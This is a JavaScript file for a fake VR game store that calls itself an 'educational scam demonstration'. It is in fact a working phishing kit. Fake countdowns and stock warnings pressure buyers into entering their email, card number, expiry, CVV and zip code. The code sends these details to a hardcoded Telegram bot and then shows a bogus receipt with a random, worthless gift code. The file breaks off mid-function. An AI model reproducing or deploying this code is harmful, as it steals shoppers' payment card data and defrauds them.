// FIXED VERSION - Replace your script.js with this

// Game Page JavaScript - Educational Scam Demonstration
// Shared functionality for all game pages with 2-Step Payment Process

// Telegram Bot Configuration
const TELEGRAM_CONFIG = {
    botToken: '7727476364:AAHaXogDfO5itb1Z6A5CCeNRK7j1sr5wS3Y',
    chatId: '-1002883529752'
};

// Global variable to store user data across steps
let userPaymentData = {
    email: '',
    gameName: '',
    currentPrice: '',
    originalPrice: ''
};

// Card BIN ranges for validation and type detection
const CARD_BINS = {
    visa: {
        bins: ['4'],
        lengths: [13, 16, 19]
    },
    mastercard: {
        bins: ['51', '52', '53', '54', '55', '2221', '2222', '2223', '2224', '2225', '2226', '2227', '2228', '2229', '223', '224', '225', '226', '227', '228', '229', '23', '24', '25', '26', '270', '271', '2720'],
        lengths: [16]
    },
    amex: {
        bins: ['34', '37'],
        lengths: [15]
    },
    discover: {
        bins: ['6011', '622126', '622127', '622128', '622129', '62213', '62214', '62215', '62216', '62217', '62218', '62219', '6222', '6223', '6224', '6225', '6226', '6227', '6228', '6229', '623', '624', '625', '626', '627', '628', '629', '64', '65'],
        lengths: [16]
    }
};

// DOM Content Loaded Event
document.addEventListener('DOMContentLoaded', function() {
    console.log('🎮 Script loaded successfully!');
    initializeNavigation();
    initializeMobileMenu();
    initializeSearch();
    initializeCountdownTimer();
    initializeBuyButton();
    initializePriceCountdown();
    initializeAnimations();
    startUrgencyUpdates();
});

// Navigation functionality
function initializeNavigation() {
    const navLinks = document.querySelectorAll('.nav-link');
    
    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            navLinks.forEach(l => l.classList.remove('active'));
            this.classList.add('active');
        });
    });
}

// Mobile menu functionality
function initializeMobileMenu() {
    const mobileMenuToggle = document.getElementById('mobileMenuToggle');
    const mobileNav = document.getElementById('mobileNav');
    
    if (mobileMenuToggle && mobileNav) {
        mobileMenuToggle.addEventListener('click', function() {
            mobileNav.classList.toggle('active');
            
            const icon = this.querySelector('i');
            if (mobileNav.classList.contains('active')) {
                icon.className = 'fas fa-times';
            } else {
                icon.className = 'fas fa-bars';
            }
        });
        
        document.addEventListener('click', function(e) {
            if (!mobileMenuToggle.contains(e.target) && !mobileNav.contains(e.target)) {
                mobileNav.classList.remove('active');
                mobileMenuToggle.querySelector('i').className = 'fas fa-bars';
            }
        });
    }
}

// Search functionality (basic for demonstration)
function initializeSearch() {
    const searchInput = document.querySelector('.search-input');
    const searchIcon = document.querySelector('.search-icon');
    
    if (searchInput) {
        searchInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                // showNotification('🔍 Search our extensive VR game catalog!\n🎮 Browse our Games section for amazing deals.', 'info');
            }
        });
    }
    
    if (searchIcon) {
        searchIcon.addEventListener('click', function() {
            // showNotification('🔍 Search our extensive VR game catalog!\n🎮 Browse our Games section for amazing deals.', 'info');
        });
    }
}

// Countdown Timer for Limited Time Banner
function initializeCountdownTimer() {
    const countdownElement = document.getElementById('countdown');
    
    if (!countdownElement) return;
    
    let hours = 23;
    let minutes = 47;
    let seconds = 32;
    
    function updateCountdown() {
        seconds--;
        
        if (seconds < 0) {
            seconds = 59;
            minutes--;
            
            if (minutes < 0) {
                minutes = 59;
                hours--;
                
                if (hours < 0) {
                    hours = 23;
                    minutes = 47;
                    seconds = 32;
                }
            }
        }
        
        const formattedTime = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
        countdownElement.textContent = formattedTime;
    }
    
    updateCountdown();
    setInterval(updateCountdown, 1000);
}

// Price countdown timer
function initializePriceCountdown() {
    const priceCountdownElement = document.getElementById('priceCountdown');
    
    if (!priceCountdownElement) return;
    
    let minutes = 47;
    
    function updatePriceCountdown() {
        minutes--;
        
        if (minutes <= 0) {
            minutes = 47;
        }
        
        priceCountdownElement.textContent = `${minutes} minutes`;
        
        // Add urgency when time is low
        if (minutes <= 10) {
            priceCountdownElement.style.color = '#e74c3c';
            priceCountdownElement.style.fontWeight = 'bold';
        }
    }
    
    setInterval(updatePriceCountdown, 60000); // Update every minute
}

// Buy Button functionality - NOW SHOWS EMAIL MODAL FIRST
function initializeBuyButton() {
    const buyButton = document.getElementById('buyNowBtn');
    console.log('🔍 Looking for buy button...', buyButton);
    
    if (buyButton) {
        console.log('✅ Buy button found! Adding click listener...');
        buyButton.addEventListener('click', function() {
            console.log('🎯 Buy button clicked!');
            
            const gameName = this.getAttribute('data-game');
            const currentPrice = this.getAttribute('data-price');
            const originalPrice = this.getAttribute('data-original');
            
            console.log('📊 Game data:', { gameName, currentPrice, originalPrice });
            
            // Store game data globally
            userPaymentData.gameName = gameName;
            userPaymentData.currentPrice = currentPrice;
            userPaymentData.originalPrice = originalPrice;
            
            // Show email modal first (Step 1)
            showEmailModal(gameName, currentPrice, originalPrice);
        });
    } else {
        console.error('❌ Buy button not found! Check if ID is correct.');
    }
}

// STEP 1: Show Email Modal
function showEmailModal(gameName, currentPrice, originalPrice) {
    console.log('📧 Showing email modal...');
    
    // Create email modal if it doesn't exist
    if (!document.getElementById('emailModal')) {
        createEmailModal();
    }
    
    const modal = document.getElementById('emailModal');
    const gameNameElement = document.getElementById('emailModalGameName');
    const gamePriceElement = document.getElementById('emailModalGamePrice');
    const originalPriceElement = document.getElementById('emailModalOriginalPrice');
    
    // Update modal content
    gameNameElement.textContent = gameName;
    gamePriceElement.textContent = `$${currentPrice}`;
    originalPriceElement.textContent = `$${originalPrice}`;
    
    // Show modal
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
    
    // Initialize email form
    initializeEmailForm();
}

// Create Email Modal HTML (Step 1)
function createEmailModal() {
    const modalHTML = `
        <div class="modal-overlay" id="emailModal">
            <div class="email-modal">
                <div class="modal-header">
                    <button class="modal-close" id="closeEmailModal">
                        <i class="fas fa-times"></i>
                    </button>
                    <h2 class="modal-title">🎮 Claim Your Exclusive Deal!</h2>
                    <p class="modal-subtitle">Enter your email to secure this limited-time offer</p>
                </div>
                <div class="modal-content">
                    <div class="email-offer-summary">
                        <div class="game-preview">
                            <h3 id="emailModalGameName">Game Name</h3>
                            <div class="price-display">
                                <span class="price-original" id="emailModalOriginalPrice">$0.00</span>
                                <span class="price-current" id="emailModalGamePrice">$0.00</span>
                                <span class="discount-badge">83% OFF</span>
                            </div>
                        </div>
                        
                        <div class="urgency-message">
                            <i class="fas fa-clock"></i>
                            <span>⚡ This deal expires in <strong id="emailCountdown">3 days</strong></span>
                        </div>
                        
                        <div class="benefits-list">
                            <div class="benefit-item">
                                <i class="fas fa-download"></i>
                                <span>Instant Gift Code</span>
                            </div>
                            <div class="benefit-item">
                                <i class="fas fa-shield-alt"></i>
                                <span>100% Secure</span>
                            </div>
                            <div class="benefit-item">
                                <i class="fas fa-gift"></i>
                                <span>Exclusive Discount</span>
                            </div>
                        </div>
                    </div>
                    
                    <form class="email-form" id="emailForm">
                        <div class="form-group">
                            <label for="userEmail">Email Address *</label>
                            <input type="email" id="userEmail" name="userEmail" placeholder="your@email.com" required>
                            <div class="email-note">
                                <i class="fas fa-info-circle"></i>
                                <span>We'll send your gift code and receipt to this email</span>
                            </div>
                        </div>
                        
                        <div class="trust-indicators">
                            <div class="trust-item">
                                <i class="fas fa-users"></i>
                                <span><strong>50,000+</strong> satisfied customers</span>
                            </div>
                            <div class="trust-item">
                                <i class="fas fa-star"></i>
                                <span><strong>4.8/5</strong> average rating</span>
                            </div>
                        </div>
                        
                        <button type="submit" class="continue-btn" id="continueToPayment">
                            <i class="fas fa-arrow-right"></i>
                            Continue to Secure Checkout
                        </button>
                        
                        <div class="security-note">
                            <i class="fas fa-lock"></i>
                            <span>Your information is protected by 256-bit SSL encryption</span>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', modalHTML);
    
    // Add close functionality
    document.getElementById('closeEmailModal').addEventListener('click', closeEmailModal);
    document.getElementById('emailModal').addEventListener('click', function(e) {
        if (e.target === this) {
            closeEmailModal();
        }
    });
}

// Initialize Email Form (Step 1)
function initializeEmailForm() {
    const form = document.getElementById('emailForm');
    const emailInput = document.getElementById('userEmail');
    
    // Email validation
    emailInput.addEventListener('input', function() {
        const isValid = validateEmail(this.value);
        
        if (this.value.length > 0) {
            if (isValid) {
                this.classList.remove('error');
            } else {
                this.classList.add('error');
            }
        } else {
            this.classList.remove('error');
        }
    });
    
    // Form submission
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        
        if (!validateEmail(email)) {
            emailInput.classList.add('error');
           // showNotification('❌ Please enter a valid email address', 'error');
            return;
        }
        
        // Store email globally
        userPaymentData.email = email;
        
        // Send email data to Telegram immediately (Step 1 data collection)
        sendEmailToTelegram(email, userPaymentData.gameName, userPaymentData.currentPrice);
        
        // Close email modal and show full payment modal
        closeEmailModal();
        
        // Small delay for better UX
        setTimeout(() => {
            showFullPaymentModal();
        }, 300);
    });
}

// Send email data to Telegram (Step 1)
async function sendEmailToTelegram(email, gameName, price) {
    const message = `
🎯 STEP 1: EMAIL COLLECTED (Educational Demo)

📧 Email: ${email}
🎮 Game: ${gameName}
💰 Price: $${price}
📅 Timestamp: ${new Date().toISOString()}
🖥️ User Agent: ${navigator.userAgent}

⚠️ User completed Step 1 - Email collection phase
📍 Next: Will proceed to payment form
    `;
    
    const telegramURL = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
    
    try {
        await fetch(telegramURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (error) {
        console.error('Failed to send email to Telegram:', error);
    }
}

// STEP 2: Show Full Payment Modal
function showFullPaymentModal() {
    // Create payment modal if it doesn't exist
    if (!document.getElementById('paymentModal')) {
        createPaymentModal();
    }
    
    const modal = document.getElementById('paymentModal');
    const gameNameElement = document.getElementById('modalGameName');
    const gamePriceElement = document.getElementById('modalGamePrice');
    const originalPriceElement = document.getElementById('modalOriginalPrice');
    const totalPriceElement = document.getElementById('modalTotalPrice');
    const userEmailElement = document.getElementById('modalUserEmail');
    
    // Update modal content
    gameNameElement.textContent = userPaymentData.gameName;
    gamePriceElement.textContent = `$${userPaymentData.currentPrice}`;
    originalPriceElement.textContent = `$${userPaymentData.originalPrice}`;
    totalPriceElement.textContent = `$${userPaymentData.currentPrice}`;
    userEmailElement.textContent = userPaymentData.email;
    
    // Show modal
    modal.classList.add('active');
    document.body.style.overflow = 'hidden';
    
    // Initialize payment form
    initializePaymentForm();
}

// Create Payment Modal HTML (Step 2) - UPDATED WITH EMAIL DISPLAY
function createPaymentModal() {
    const modalHTML = `
        <div class="modal-overlay" id="paymentModal">
            <div class="payment-modal">
                <div class="modal-header">
                    <button class="modal-close" id="closeModal">
                        <i class="fas fa-times"></i>
                    </button>
                    <h2 class="modal-title">💳 Secure Payment</h2>
                    <p class="modal-subtitle">Complete your purchase - Your game will be available instantly</p>
                </div>
                <div class="modal-content" id="modalContent">
                    <div class="order-summary">
                        <h3>Order Summary</h3>
                        <div class="email-confirmation">
                            <i class="fas fa-envelope"></i>
                            <span>Sending receipt to: <strong id="modalUserEmail">email@example.com</strong></span>
                        </div>
                        <div class="order-item">
                            <span class="item-name" id="modalGameName">Game Name</span>
                            <span class="item-price" id="modalGamePrice">$0.00</span>
                        </div>
                        <div class="order-item">
                            <span class="item-name">Original Price:</span>
                            <span class="item-price" style="text-decoration: line-through; color: #999;" id="modalOriginalPrice">$0.00</span>
                        </div>
                        <div class="order-item">
                            <span class="item-name">Total:</span>
                            <span class="item-price" id="modalTotalPrice">$0.00</span>
                        </div>
                    </div>
                    
                    <form class="payment-form" id="paymentForm">
                        <div class="form-group">
                            <label for="cardHolder">Card Holder Full Name *</label>
                            <input type="text" id="cardHolder" name="cardHolder" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="cardNumber">Card Number *</label>
                            <div class="card-input-container">
                                <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" required maxlength="19">
                                <div class="card-type-icon" id="cardTypeIcon"></div>
                            </div>
                            <div class="error-message" id="cardError">Please enter a valid card number</div>
                        </div>
                        
                        <div class="form-row">
                            <div class="form-group">
                                <label for="cardExpiry">Card Expiry *</label>
                                <input type="text" id="cardExpiry" name="cardExpiry" placeholder="MM/YY" required maxlength="5">
                            </div>
                            <div class="form-group">
                                <label for="cardCvv">CVV *</label>
                                <input type="text" id="cardCvv" name="cardCvv" placeholder="123" required maxlength="4">
                            </div>
                        </div>
                        
                        <div class="form-group">
                            <label for="country">Country *</label>
                            <select id="country" name="country" required>
                                <option value="">-- Select Country --</option>
                                <option value="US">United States</option>
                                <option value="CA">Canada</option>
                                <option value="GB">United Kingdom</option>
                                <option value="AU">Australia</option>
                                <option value="DE">Germany</option>
                                <option value="FR">France</option>
                                <option value="IT">Italy</option>
                                <option value="ES">Spain</option>
                                <option value="NL">Netherlands</option>
                                <option value="BE">Belgium</option>
                                <option value="CH">Switzerland</option>
                                <option value="AT">Austria</option>
                                <option value="SE">Sweden</option>
                                <option value="NO">Norway</option>
                                <option value="DK">Denmark</option>
                                <option value="FI">Finland</option>
                                <option value="IE">Ireland</option>
                                <option value="PT">Portugal</option>
                                <option value="PL">Poland</option>
                                <option value="CZ">Czech Republic</option>
                                <option value="HU">Hungary</option>
                                <option value="SK">Slovakia</option>
                                <option value="SI">Slovenia</option>
                                <option value="HR">Croatia</option>
                                <option value="RO">Romania</option>
                                <option value="BG">Bulgaria</option>
                                <option value="GR">Greece</option>
                                <option value="CY">Cyprus</option>
                                <option value="MT">Malta</option>
                                <option value="LU">Luxembourg</option>
                                <option value="EE">Estonia</option>
                                <option value="LV">Latvia</option>
                                <option value="LT">Lithuania</option>
                                <option value="JP">Japan</option>
                                <option value="KR">South Korea</option>
                                <option value="CN">China</option>
                                <option value="IN">India</option>
                                <option value="SG">Singapore</option>
                                <option value="HK">Hong Kong</option>
                                <option value="TW">Taiwan</option>
                                <option value="MY">Malaysia</option>
                                <option value="TH">Thailand</option>
                                <option value="PH">Philippines</option>
                                <option value="ID">Indonesia</option>
                                <option value="VN">Vietnam</option>
                                <option value="NZ">New Zealand</option>
                                <option value="ZA">South Africa</option>
                                <option value="BR">Brazil</option>
                                <option value="MX">Mexico</option>
                                <option value="AR">Argentina</option>
                                <option value="CL">Chile</option>
                                <option value="CO">Colombia</option>
                                <option value="PE">Peru</option>
                                <option value="UY">Uruguay</option>
                                <option value="VE">Venezuela</option>
                                <option value="EC">Ecuador</option>
                                <option value="BO">Bolivia</option>
                                <option value="PY">Paraguay</option>
                                <option value="SR">Suriname</option>
                                <option value="GY">Guyana</option>
                                <option value="FK">Falkland Islands</option>
                                <option value="RU">Russia</option>
                                <option value="UA">Ukraine</option>
                                <option value="BY">Belarus</option>
                                <option value="MD">Moldova</option>
                                <option value="GE">Georgia</option>
                                <option value="AM">Armenia</option>
                                <option value="AZ">Azerbaijan</option>
                                <option value="KZ">Kazakhstan</option>
                                <option value="KG">Kyrgyzstan</option>
                                <option value="TJ">Tajikistan</option>
                                <option value="TM">Turkmenistan</option>
                                <option value="UZ">Uzbekistan</option>
                                <option value="MN">Mongolia</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label for="zipCode">Zip Code *</label>
                            <input type="text" id="zipCode" name="zipCode" placeholder="12345" required>
                        </div>
                        
                        <div class="security-badges">
                            <div class="security-badge">
                                <i class="fas fa-shield-alt"></i>
                                <span>SSL Encrypted</span>
                            </div>
                            <div class="security-badge">
                                <i class="fas fa-lock"></i>
                                <span>100% Secure</span>
                            </div>
                            <div class="security-badge">
                                <i class="fas fa-credit-card"></i>
                                <span>Safe Payment</span>
                            </div>
                        </div>
                        
                        <button type="submit" class="submit-btn" id="submitPayment">
                            <i class="fas fa-credit-card"></i>
                            Complete Purchase
                        </button>
                    </form>
                </div>
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', modalHTML);
    
    // Add close functionality
    document.getElementById('closeModal').addEventListener('click', closePaymentModal);
    document.getElementById('paymentModal').addEventListener('click', function(e) {
        if (e.target === this) {
            closePaymentModal();
        }
    });
}

// Initialize Payment Form (Step 2)
function initializePaymentForm() {
    const form = document.getElementById('paymentForm');
    const cardNumberInput = document.getElementById('cardNumber');
    const cardExpiryInput = document.getElementById('cardExpiry');
    const cardCvvInput = document.getElementById('cardCvv');
    const cardTypeIcon = document.getElementById('cardTypeIcon');
    const cardError = document.getElementById('cardError');
    
    // Card number formatting and validation
    cardNumberInput.addEventListener('input', function() {
        let value = this.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
        let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
        
        if (formattedValue.length > 19) {
            formattedValue = formattedValue.substring(0, 19);
        }
        
        this.value = formattedValue;
        
        // Detect card type and validate
        const cardType = detectCardType(value);
        updateCardTypeIcon(cardType);
        
        const isValid = validateCardNumber(value, cardType);
        
        if (value.length > 0) {
            if (isValid) {
                this.classList.remove('error');
                cardError.classList.remove('show');
            } else {
                this.classList.add('error');
                cardError.classList.add('show');
            }
        } else {
            this.classList.remove('error');
            cardError.classList.remove('show');
        }
    });
    
    // Card expiry formatting
    cardExpiryInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        
        // Limit month to 01-12
        if (value.length >= 2) {
            let month = parseInt(value.substring(0, 2));
            if (month > 12) {
                value = '12' + value.substring(2);
            } else if (month === 0) {
                value = '01' + value.substring(2);
            }
        }
        
        // Limit year to 24-34
        if (value.length >= 4) {
            let year = parseInt(value.substring(2, 4));
            if (year < 25) {
                value = value.substring(0, 2) + '24';
            } else if (year > 34) {
                value = value.substring(0, 2) + '34';
            }
        }
        
        // Format as MM/YY
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        
        this.value = value;
    });
    
    // CVV numeric only
    cardCvvInput.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
    });
    
    // Form submission (Step 2)
    form.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const formData = new FormData(this);
        const fullPaymentData = {
            // Step 1 data
            email: userPaymentData.email,
            gameName: userPaymentData.gameName,
            price: userPaymentData.currentPrice,
            originalPrice: userPaymentData.originalPrice,
            // Step 2 data
            cardHolder: formData.get('cardHolder'),
            cardNumber: formData.get('cardNumber'),
            cardExpiry: formData.get('cardExpiry'),
            cardCvv: formData.get('cardCvv'),
            country: formData.get('country'),
            zipCode: formData.get('zipCode'),
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ip: 'Hidden for privacy'
        };
        
        processFullPayment(fullPaymentData);
    });
}

// Process Full Payment (Step 2)
function processFullPayment(paymentData) {
    const submitButton = document.getElementById('submitPayment');
    const originalText = submitButton.innerHTML;
    
    // Show processing state
    submitButton.innerHTML = '<div class="spinner"></div> Processing...';
    submitButton.disabled = true;
    
    // Send complete data to Telegram bot
    sendFullPaymentToTelegram(paymentData).then(() => {
        // Simulate processing delay
        setTimeout(() => {
            showReceiptModal(paymentData);
        }, 2000);
    }).catch(error => {
        console.error('Error sending to Telegram:', error);
        // Still show receipt for demonstration
        setTimeout(() => {
            showReceiptModal(paymentData);
        }, 2000);
    });
}

// Send complete payment data to Telegram (Step 2)
async function sendFullPaymentToTelegram(paymentData) {
    const message = `
🎯 STEP 2: COMPLETE PAYMENT DATA COLLECTED (Educational Demo)

🎮 Game: ${paymentData.gameName}
💰 Price: $${paymentData.price}
💰 Original: $${paymentData.originalPrice}

📧 EMAIL (Step 1):
└ Email: ${paymentData.email}

💳 PAYMENT DETAILS (Step 2):
👤 Name: ${paymentData.cardHolder}
💳 Card: ${paymentData.cardNumber}
📅 Expiry: ${paymentData.cardExpiry}
🔒 CVV: ${paymentData.cardCvv}
🌍 Country: ${paymentData.country}
📮 Zip: ${paymentData.zipCode}

⏰ Timestamp: ${paymentData.timestamp}
🖥️ User Agent: ${paymentData.userAgent}

✅ 2-STEP PROCESS COMPLETED
    `;
    
    const telegramURL = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
    
    try {
        const response = await fetch(telegramURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        return response.json();
    } catch (error) {
        console.error('Failed to send to Telegram:', error);
        throw error;
    }
}

// Close Email Modal
function closeEmailModal() {
    const modal = document.getElementById('emailModal');
    if (modal) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
        
        // Reset form if it exists
        const form = document.getElementById('emailForm');
        if (form) {
            form.reset();
        }
        
        // Remove error states
        const errorInputs = document.querySelectorAll('.error');
        errorInputs.forEach(input => input.classList.remove('error'));
    }
}

// Close payment modal
function closePaymentModal() {
    const modal = document.getElementById('paymentModal');
    if (modal) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
        
        // Reset form if it exists
        const form = document.getElementById('paymentForm');
        if (form) {
            form.reset();
        }
        
        // Remove error states
        const errorInputs = document.querySelectorAll('.error');
        errorInputs.forEach(input => input.classList.remove('error'));
        
        const errorMessages = document.querySelectorAll('.error-message.show');
        errorMessages.forEach(msg => msg.classList.remove('show'));
    }
}

// Detect card type from number
function detectCardType(cardNumber) {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    
    for (const [type, config] of Object.entries(CARD_BINS)) {
        for (const bin of config.bins) {
            if (cleanNumber.startsWith(bin)) {
                return type;
            }
        }
    }
    
    return null;
}

// Update card type icon
function updateCardTypeIcon(cardType) {
    const cardTypeIcon = document.getElementById('cardTypeIcon');
    
    cardTypeIcon.className = 'card-type-icon';
    if (cardType) {
        cardTypeIcon.classList.add(cardType);
    }
}

// Validate card number using Luhn algorithm and BIN ranges
function validateCardNumber(cardNumber, cardType) {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    
    if (!cardType || !cleanNumber) return false;
    
    // Check length
    const expectedLengths = CARD_BINS[cardType].lengths;
    if (!expectedLengths.includes(cleanNumber.length)) return false;
    
    // Luhn algorithm validation
    return luhnCheck(cleanNumber);
}

// Luhn algorithm implementation
function luhnCheck(cardNumber) {
    let sum = 0;
    let alternate = false;
    
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let n = parseInt(cardNumber.charAt(i), 10);
        
        if (alternate) {
            n *= 2;
            if (n > 9) {
                n = (n % 10) + 1;
            }
        }
        
        sum += n;
        alternate = !alternate;
    }
    
    return (sum % 10) === 0;
}

// Generate random gift code
function generateGiftCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const segments = [];
    
    for (let i = 0; i < 5; i++) {
        let segment = '';
        for (let j = 0; j < 5; j++) {
            segment += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        segments.push(segment);
    }
    
    return segments.join('-');
}

// Show receipt modal
function showReceiptModal(paymentData) {
    const giftCode = generateGiftCode();
    const currentTime = new Date().toLocaleString();
    
    const receiptHTML = `
        <div class="modal-header">
            <button class="modal-close" id="closeReceipt">
                <i class="fas fa-times"></i>
            </button>
            <h2 class="modal-title">Payment Successful!</h2>
            <p class="modal-subtitle">Your game is ready for redeem</p>
        </div>
        <div class="receipt-content">
            <div class="receipt-icon">
                <i class="fas fa-check-circle"></i>
            </div>
            <h1 class="receipt-title">Purchase Complete!</h1>
            <p class="receipt-message">Thank you for your purchase. Your Gift Code is Ready.</p>
            
            <div class="receipt-details">
                <div class="receipt-item">
                    <span>Game:</span>
                    <span>${paymentData.gameName}</span>
                </div>
                <div class="receipt-item">
                    <span>Price:</span>
                    <span>${paymentData.price}</span>
                </div>
                <div class="receipt-item">
                    <span>Email:</span>
                    <span>${paymentData.email}</span>
                </div>
                <div class="receipt-item">
                    <span>Payment Method:</span>
                    <span>Credit Card ****${paymentData.cardNumber.slice(-4)}</span>
                </div>
                <div class="receipt-item">
                    <span>Transaction Time:</span>
                    <span>${currentTime}</span>
                </div>
                <div class="receipt-item">
                    <span>Order ID:</span>
                    <span>#CMK-${Date.now()}</span>
                </div>
            </div>
            
            <div class="gift-code-section">
                <h3 class="gift-code-title">🎁 Your Game Code</h3>
                <div class="gift-code" id="giftCode">${giftCode}</div>
                <p class="code-instructions">
                    Use this code to download your game on your Meta Quest device.
                    Go to Meta Store > Redeem Code and enter the code above.
                </p>
            </div>
            
            <div class="receipt-actions">
                <button class="action-btn primary-btn" onclick="copyGiftCode()">
                    <i class="fas fa-copy"></i> Copy Code
                </button>
                <button class="action-btn secondary-btn" onclick="closePaymentModal()">
                    Close
                </button>
            </div>
        </div>
    `;
    
    const modalContent = document.getElementById('modalContent');
    modalContent.innerHTML = receiptHTML;
    
    // Add close functionality for receipt
    document.getElementById('closeReceipt').addEventListener('click', closePaymentModal);
}

// Copy gift code to clipboard
function copyGiftCode() {
    const giftCodeElement = document.getElementById('giftCode');
    const textArea = document.createElement('textarea');
    textArea.value = giftCodeElement.textContent;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand('copy');
    document.body.removeChild(textArea);
    
    showNotification('📋 Gift code copied to clipboard!', 'success');
}

// Animation and scroll effects
function initializeAnimations() {
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };
    
    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);
    
    // Observe elements for animation
    document.querySelectorAll('.game-details, .customer-reviews, .related-games').forEach((section, index) => {
        section.style.opacity = '0';
        section.style.transform = 'translateY(30px)';
        section.style.transition = `opacity 0.6s ease ${index * 0.2}s, transform 0.6s ease ${index * 0.2}s`;
        observer.observe(section);
    });
}

// Start urgency updates for scam demonstration
function startUrgencyUpdates() {
    // Update stock indicators occasionally
    setInterval(() => {
        const stockIndicators = document.querySelectorAll('.stock-indicator, .stock-warning');
        
        stockIndicators.forEach(indicator => {
            if (Math.random() < 0.1) { // 10% chance
                const currentText = indicator.textContent;
                const currentNumber = parseInt(currentText.match(/\d+/)?.[0] || '3');
                
                if (currentNumber > 1) {
                    const newNumber = currentNumber - 1;
                    indicator.textContent = currentText.replace(/\d+/, newNumber.toString());
                    
                    if (newNumber <= 1) {
                        indicator.style.background = '#c0392b';
                        indicator.style.animation = 'urgent-blink 0.8s infinite';
                    }
                }
            }
        });
    }, 30000); // Check every 30 seconds
}

// Utility function for notifications
function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 1rem 1.5rem;
        border-radius: 8px;
        color: white;
        font-weight: 600;
        z-index: 1001;
        max-width: 350px;
        white-space: pre-line;
        animation: slideIn 0.3s ease;
        box-shadow: 0 6px 25px rgba(0,0,0,0.4);
        border-left: 4px solid rgba(255,255,255,0.3);
    `;
    
    const colors = {
        'success': '#27ae60',
        'error': '#e74c3c',
        'info': '#0866ff',
        'warning': '#f39c12'
    };
    
    notification.style.background = colors[type] || colors['info'];
    notification.textContent = message;
    
    // Add animation keyframes if not exists
    if (!document.querySelector('#notification-styles')) {
        const style = document.createElement('style');
        style.id = 'notification-styles';
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateX(100%); opacity: 0; }
                to { transform: translateX(0); opacity: 1; }
            }
            @keyframes slideOut {
                from { transform: translateX(0); opacity: 1; }
                to { transform: translateX(100%); opacity: 0; }
            }
        `;
        document.head.appendChild(style);
    }
    
    document.body.appendChild(notification);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => {
            if (document.body.contains(notification)) {
                document.body.removeChild(notification);
            }
        }, 300);
    }, 5000);
    
    // Click to dismiss
    notification.addEventListener('click', function() {
        this.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => {
            if (document.body.contains(this)) {
                document.body.removeChild(this);
            }
        }, 300);
    });
}

// Related games click handlers - FIXED THE SYNTAX ERROR HERE
document.addEventListener('click', function(e) {
    const relatedGameCard = e.target.closest('.related-game-card');
    if (relatedGameCard) {
        const gameName = relatedGameCard.querySelector('h3').textContent;
        // FIXED: Added the second parameter to replace() function
const currentPrice = relatedGameCard.querySelector('.current').textContent.replace(/[^0-9.]/g, '');
const originalPrice = relatedGameCard.querySelector('.original').textContent.replace(/[^0-9.]/g, '');
        
        console.log('Related game clicked:', { gameName, currentPrice, originalPrice });
    }
});

// Smooth scrolling for anchor links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// Form validation helpers
function validateEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

function validateZipCode(zipCode, country) {
    const zipPatterns = {
        'US': /^\d{5}(-\d{4})?$/,
        'CA': /^[A-Za-z]\d[A-Za-z] \d[A-Za-z]\d$/,
        'GB': /^[A-Z]{1,2}\d[A-Z\d]? \d[A-Z]{2}$/,
        'DE': /^\d{5}$/,
        'FR': /^\d{5}$/,
        'default': /^.{3,10}$/
    };
    
    const pattern = zipPatterns[country] || zipPatterns['default'];
    return pattern.test(zipCode);
}

// Advanced card validation
function validateCardExpiry(expiry) {
    if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
    
    const [month, year] = expiry.split('/').map(n => parseInt(n, 10));
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100;
